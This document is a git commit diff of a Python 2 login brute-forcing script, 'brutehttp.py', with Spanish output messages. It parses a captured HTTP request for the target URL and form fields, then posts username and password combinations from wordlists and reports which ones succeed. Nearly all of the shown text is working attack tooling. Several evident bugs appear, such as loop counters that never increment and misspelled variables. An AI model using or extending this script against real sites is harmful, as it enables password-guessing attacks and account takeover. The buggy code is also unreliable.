e98ed2936d59e48cbc3f456e459006b186747677
root <root@debian>
2017-10-25 01:04:35 -0500

    Bruteforce Request HTTP

--- brutehttp.py
+++ brutehttp.py
@@ -1,33 +1,75 @@
 #!/usr/bin/python
 
+import re
+import sys
 import requests
 import argparse
-import sys
-from lxml.html import fromstring
 import os.path
 
 arg = ''
-url = ''
-userField = ''
-passField = ''
+reqFile = ''
 user = ''
 pwd = ''
+userField = ''
+passField = ''
 userFile = ''
-pwdFile = ''
+passile = ''
 message = ''
+op = ''
+
+def checkFile(reqFile,user,pwd,userFile,passFile,message):
 	
+	if os.path.exists(reqFile):
+		fo = open(reqFile,'r')
+		for line in fo:
+			regex = re.compile(r'Referer\: (.*)')
+			match = regex.search(line)
+			try:
+				if match.group():
+					url = match.group(1)
+			except:		
+				regex = re.compile(r'(.*)(\=)(.*)(\&)(.*)(\=)(.*)')
+				match = regex.search(line)
+				try:
+					if match.group():
+						userField = match.group(1)
+						passField = match.group(5)
+				except:
+					continue
+		fo.close()
+	
+	
+	
+	if user == '' and pwd == '':
+		doubleFile(url,userField,passField,user,pwd,userFile,passFile,message)
+		print 'double'
+		
+	elif user == '' and passFile == '':
+		usersFile(url,userField,passField,user,pwd,userFile,passFile,message)
+		print 'users'
+	
+	elif userFile == '' and pwd == '':
+		print 'entra pwd'
+		pwdFile(url, userField, passField, user, pwd, userFile, passFile, message)
+		
+	elif userFile == '' and passFile == '':
+		single(url,userField,passField,user,pwd,userFile,passFile,message)
+		print 'single'
+			
 
 
-	
 def single(url, userField, passField, user, pwd, userFile, pwdFile, message):
 	#Antes del ataque
-	mbefore = message
 	
+	mbefore = message	
 	#Login
 	req = requests.post(url)
+	
 	for key, value in (req.headers).iteritems():
 		if key.startswith('content-length'):
+			print value
 			cb = value
+			print cb
 		else: 
 			continue
 	
@@ -45,10 +87,10 @@ def single(url, userField, passField, user, pwd, userFile, pwdFile, message):
 	mafter =  r.text
 	
 	if mbefore in mafter or op>=110 and op<=120:
+	
 		print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + pwd
 	else:
 		print "Ataque exitoso con:" + "User: " + user  + " Password: " + pwd
-	
 
 def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
 	users = []
@@ -91,6 +133,7 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
 				print "Ataque exitoso con:" + " User: " + users[i]  + " Password: " + pwd
 
 def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
+	print 'entra pwd'
 	passwords = []
 	if os.path.exists(pwdFile): #archivo con usuarios
 		fo = open(pwdFile, 'r')
@@ -106,7 +149,7 @@ def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
 			for key, value in (req.headers).iteritems():
 				if key.startswith('content-length'):
 					cb = value
-					#print value
+				
 				else: 
 					continue
 	
@@ -117,7 +160,7 @@ def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
 				if key.startswith('content-length'):
 					ca = value
 					op = int(ca) - int(cb)
-					#print op
+					
 				else: 
 					continue
 	
@@ -125,12 +168,14 @@ def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
 			#Login exitoso
 			mafter =  r.text
 			if mbefore in mafter or op <= 0 or op>=110 and op<=120:
+			
 				print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + passwords[i]
 			else:
 				print "Ataque exitoso con:" + " User: " + user  + " Password: " + passwords[i]
 
 
 def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
+	print 'double'
 	users = []
 	passwords = []
 	i = 0
@@ -182,23 +227,20 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message)
 					
 				j + 1
 			i + 1
-		
+
+
 
 
 def getParams(arg):
 	parser = argparse.ArgumentParser(description='Fuerza Bruta',
 		formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 
-	parser.add_argument('-b', '--bruteforce', help = 'URL Site', required=True)
-	parser.add_argument('-f','--userField', help = 'User Field to attack', required=True)
-	parser.add_argument('-F', '--passField', help = 'Password Field to attack', required=True)
+	parser.add_argument('-r', '--reqfile', help = 'File with HTTP request', required=True)
 	parser.add_argument('-u', '--user', help = 'User account')
 	parser.add_argument('-p', '--password', help='User\'s password')
 	parser.add_argument('-U', '--users', help='File with users')
 	parser.add_argument('-P', '--passwords', help='File with passwords')
 	parser.add_argument('-m', '--message', help='Error message', required=True)
-	
-	
 					
 	options = parser.parse_args()
 	
@@ -207,13 +249,13 @@ def getParams(arg):
 		print parser.print_help()
 	
 	if options.user is None and options.password is None and options.users is not None and options.passwords is not None:
-		doubleFile(options.bruteforce,options.userField,options.passField,'','',options.users,options.passwords,options.message)
+		checkFile(options.reqfile,'','',options.users,options.passwords,options.message)
 	elif options.password is None and options.users is None and options.user is not None and options.passwords is not None:
-		pwdFile(options.bruteforce,options.userField,options.passField,options.user,'','',options.passwords,options.message)
+		checkFile(options.reqfile,options.user,'','',options.passwords,options.message)
 	elif options.user is None and options.passwords is None and options.users is not None and options.password is not None:
-		usersFile(options.bruteforce,options.userField,options.passField,'',options.password,options.users,'',options.message)
-	elif options.users is None and options.passwords is None and options.user is not None and options.password is not None:
-		single(options.bruteforce,options.userField,options.passField,options.user,options.password,'','',options.message)
+		checkFile(options.reqfile,'',options.password,options.users,'',options.message)
+	if options.users is None and options.passwords is None and options.user is not None and options.password is not None:
+		checkFile(options.reqfile,options.user,options.password,'','',options.message)	
 	elif options.user is None and options.users is None or options.password is None and options.passwords is None:
 		print parser.print_help()
 		
